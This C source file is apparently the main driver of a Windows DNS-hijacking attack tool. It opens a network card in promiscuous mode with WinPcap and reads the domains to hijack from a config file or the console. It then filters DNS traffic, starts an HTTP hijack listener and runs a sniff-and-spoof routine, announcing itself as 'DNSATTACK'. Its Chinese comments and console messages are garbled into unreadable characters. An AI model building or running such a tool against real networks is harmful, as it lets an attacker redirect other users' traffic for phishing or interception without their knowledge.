

#include <stdio.h>
#include <WINSOCK2.H>
#include <windows.h>
#include "Public.h"
#include "Packet.h"
#include "DnsHijack.h"
#include "httphijack.h"
#include "include\\pcap.h"
#include "include\\pcap\\pcap.h"
#include "include\\openssl\\ssl.h"
#include "include\\openssl\\err.h"

#pragma comment ( lib, "lib\\libeay32.lib" )
#pragma comment ( lib, "lib\\ssleay32.lib" )
#pragma comment(lib,"lib\\wpcap.lib")
#pragma comment(lib,"ws2_32.lib")



char			gHijackDnsName[MAX_DNS_HIJACK_COUNT][MAX_PATH] = {0};
DWORD			gHijackDnsIP[MAX_DNS_HIJACK_COUNT] = {0};
DWORD			gHijackDnsNameCnt = 0;
DWORD			gLocalIPAddr = 0;






int __cdecl main(int argc, TCHAR* argv[])
{
	int	nRetCode = 0;
	char szInitFile[MAX_PATH];
	nRetCode = GetCurrentDirectoryA(MAX_PATH,szInitFile);
	lstrcatA(szInitFile,"\\");
	lstrcatA(szInitFile,DNS_INIT_FILENAME);

	WSADATA		stWsa = {0};
	nRetCode = WSAStartup(WSASTARTUP_VERSION,&stWsa);
	if (nRetCode)
	{
		printf("WSAStartup error,error code is:%d\n", GetLastError());
		getchar();
		return -1;
	}

	//gLocalIPAddr = inet_addr("192.168.200.131");
	gLocalIPAddr = GetLocalIpAddress();

	//pcap_if = pcap_if_t     pcap_t = pcap
	pcap_t *	pcapMain = 0;
	pcap_if_t * pcapDevBuf = 0;
	pcap_if_t * pcapTmpDev = 0;
	int			iChooseNum = 0;
	int			iTmp = 0;
	char		strPcapErrBuf[PCAP_ERRBUF_SIZE];
	char		szInputDnsName[MAX_PATH];
	char *		pszDnsConfigName = 0;

	if (pcap_findalldevs(&pcapDevBuf, strPcapErrBuf) == -1)
	{
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", strPcapErrBuf);
		getchar();
		exit(0);
	}

	printf("������װ�������б�����:\n");
	for(pcapTmpDev = pcapDevBuf; pcapTmpDev; pcapTmpDev = pcapTmpDev->next)
	{
		printf("��������: %d\n��������: %s\n��������: %s\r\n\r\n",iTmp + 1, pcapTmpDev->name, pcapTmpDev->description);
		++ iTmp;
	}

	if(iTmp==0)
	{
		printf("No interfaces found! Make sure WinPcap is installed\n");
		pcap_freealldevs(pcapDevBuf);
		getchar();
		return -1;
	}

	HANDLE hFileInit = CreateFileA(szInitFile,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if(hFileInit == INVALID_HANDLE_VALUE)
	{
		printf("δ�ҵ������ļ����������ļ�����,���ֶ���������ץ������(1-%d):",iTmp);
		scanf_s("%d", &iChooseNum);
		printf("\n");

		printf("������Ҫ�ٳֵ�DNS����:");
		scanf_s("%s", szInputDnsName);
		printf("\n");

		lstrcpyA(gHijackDnsName[gHijackDnsNameCnt],szInputDnsName);
		gHijackDnsNameCnt ++;
	}
	else
	{
		DWORD dwFileSize = GetFileSize(hFileInit,0);
		pszDnsConfigName = new char [dwFileSize + 0x1000];
		DWORD dwCnt = 0;
		nRetCode = ReadFile(hFileInit,pszDnsConfigName,dwFileSize,&dwCnt,0);
		CloseHandle(hFileInit);
		if (nRetCode == 0 || dwFileSize != dwCnt)
		{
			pcap_freealldevs(pcapDevBuf);
			getchar();
			return FALSE;
		}
		*(dwFileSize + pszDnsConfigName) = 0;

		char * pEnd = pszDnsConfigName;
		char * pHdr = strstr(pEnd,"netcard=");
		if (pHdr)
		{
			pHdr += lstrlenA("netcard=");
			pEnd = strstr(pHdr,"\r\n");
			if (pEnd && pEnd - pHdr < MAX_PATH)
			{
				char szNum[MAX_PATH] = {0};
				memmove(szNum,pHdr,pEnd - pHdr);
				iChooseNum = atoi(szNum);

				pEnd += 2;
				pHdr = pEnd;

				while (TRUE)
				{
					pEnd = strstr(pHdr,"\r\n");
					if (pEnd )
					{
						int iDnsNameLen = pEnd - pHdr ;
						if(iDnsNameLen < MAX_PATH && iDnsNameLen > 0)
						{
							memset(gHijackDnsName[gHijackDnsNameCnt],0,MAX_PATH);
							memmove(gHijackDnsName[gHijackDnsNameCnt],pHdr,pEnd - pHdr);
							hostent * pHost = gethostbyname(gHijackDnsName[gHijackDnsNameCnt]);
							if (pHost == 0)
							{
								printf("domain name:%s is not found\r\n",gHijackDnsName[gHijackDnsNameCnt]);
							}
							else
							{
								memcpy(&gHijackDnsIP[gHijackDnsNameCnt], pHost->h_addr_list[0], sizeof(in_addr)); 
								unsigned char * pIP = (unsigned char*)&gHijackDnsIP[gHijackDnsNameCnt];
								printf("domain name:%s ip:%u.%u.%u.%u\r\n",gHijackDnsName[gHijackDnsNameCnt],pIP[0],pIP[1],pIP[2],pIP[3]);
								gHijackDnsNameCnt ++;
							}
						}
						pEnd += 2;
						pHdr = pEnd;
					}
					else
					{
						break;
					}
				}
			}
		}
		delete []pszDnsConfigName;
		if (gHijackDnsNameCnt == 0 || iChooseNum == 0)
		{
			printf("process config file error\r\n");
			pcap_freealldevs(pcapDevBuf);
			getchar();
			return -1;
		}
	}

	if(iChooseNum < 1 || iChooseNum > iTmp)
	{
		printf("Interface number out of range\n");
		pcap_freealldevs(pcapDevBuf);
		getchar();
		return -1;
	}

	
	for(pcapTmpDev = pcapDevBuf, iTmp = 0; iTmp < iChooseNum-1; pcapTmpDev = pcapTmpDev->next, iTmp ++);

	//snaplen��ʾ���������ֽ�����������ֵС�ڱ���������ݰ��Ĵ�С����ֻ��ʾǰsnaplenλ��ʵ�����������Ϊȫ��0����ͨ���������ݰ��Ĵ�С���ᳬ��65535
	//������ֵΪ0���������һֱ�ȴ��㹻������ݰ�����
	if ((pcapMain = pcap_open_live(pcapTmpDev->name,MAX_PACKET_SIZE,PCAP_OPENFLAG_PROMISCUOUS,1,strPcapErrBuf)) == NULL)
	{
		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", pcapTmpDev->name);
		pcap_freealldevs(pcapDevBuf);
		getchar();
		return -1;
	}

	
	nRetCode = pcap_setbuff(pcapMain,WINPCAP_MAX_BUFFER_SIZE);	//the limit buffer size of capraw is 100M
	if( nRetCode == -1)
	{
		printf("pcap_setbuff error!the limit of the buffer size is 100M,maybe it is too big!\n");
		getchar();
		return FALSE;
	}	

#define PCAP_FILTER_MASK_VALUE 0xffffff
	bpf_program		stBpfp = {0};
	u_int			uiMypcapNetMask = PCAP_FILTER_MASK_VALUE;
	ULONG netmask =PCAP_FILTER_MASK_VALUE;
	unsigned long mask = *(ULONG*)&(((struct sockaddr_in*)pcapTmpDev->addresses->netmask)->sin_addr);
	netmask = mask;
	nRetCode = pcap_compile(pcapMain, &stBpfp, PCAP_DNS_PORT_FILTER, TRUE, netmask);
	if(nRetCode <0 )
	{		
		fprintf(stderr,"���ݰ����������﷨����ʧ��,��������������﷨����\n");
		pcap_freealldevs(pcapDevBuf);
		getchar();
		return FALSE;
	}
	nRetCode = pcap_setfilter(pcapMain, &stBpfp);
	if( nRetCode < 0 )
	{
		fprintf(stderr,"���ݰ�������������ʧ��\n");
		pcap_freealldevs(pcapDevBuf);
		getchar();
		return FALSE;
	}
	
	unsigned long ulHttpID;
	HANDLE hHttpListen = CreateThread(0,0,(LPTHREAD_START_ROUTINE)HTTPListenThread,0,0,&ulHttpID);
	if (hHttpListen == 0)
	{
		printf("�����߳�ʧ��\n");
		getchar();
		exit(-1);
	}
	CloseHandle(hHttpListen);

	
	printf("DNSATTACK���ڼ�������:%s\n", pcapTmpDev->description);
	
	//CloseHandle(CreateThread(0,0,(LPTHREAD_START_ROUTINE)DnsSnifferHijack,pcapMain,0,0));
	//Sleep(-1);
	nRetCode = DnsSnifferHijack(pcapMain);
	pcap_freealldevs(pcapDevBuf);
	return nRetCode;
}
